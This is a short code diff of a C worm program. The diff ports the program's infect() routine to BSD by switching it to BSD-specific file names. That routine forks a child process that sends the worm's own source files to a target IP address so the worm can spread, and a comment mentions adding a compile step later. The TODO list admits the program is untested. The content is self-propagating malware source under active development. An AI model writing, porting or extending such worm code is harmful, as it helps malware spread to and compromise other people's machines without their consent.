@@ -1,6 +1,5 @@
 /*
 TODO:
-- ensure that the correct BSD versions of the files are being pulled in (they arent right now?)
 - ensure the "&" command actually runs the compiled programs (could use "./" instead?)
 - convert this file to old C so that this can be ran on BSD systems
 - test this program at all...
@@ -212,13 +211,13 @@ void infect(char *ip, char *my_ip) {
 	if (fork() == 0) {
 		// Child ps executes send_file_over_socket with worm files and itself
 		char *argv[] = {
-			"send_file_over_socket",
-			"worm.c",
-			"worm.h",
+			"send_file_over_socket_bsd",
+			"worm_bsd.c",
+			"worm_bsd.h",
             // "send_file_over_socket.c" try just sending binary for now, could add compile step later
 			NULL
 		};
-		execv("./send_file_over_socket", argv);
+		execv("./send_file_over_socket_bsd", argv);
 		exit(1);  /* If execv fails */
 	}
 
